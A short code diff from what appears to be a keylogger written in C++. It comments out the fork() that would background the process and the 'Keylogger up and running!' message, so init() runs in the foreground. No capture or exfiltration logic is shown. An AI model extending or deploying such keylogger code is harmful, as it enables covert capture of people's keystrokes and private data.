@@ -48,10 +48,10 @@ void runChecker(const std::string &logPath, Tree &tree, const std::string &name)
 int main (int argc, char *argv[])
 {
 
-	if (!fork())
+//	if (!fork())
 		init();
-	else
-		std::cout << "Keylogger up and running!\n";
+//	else
+//		std::cout << "Keylogger up and running!\n";
 
 }
 
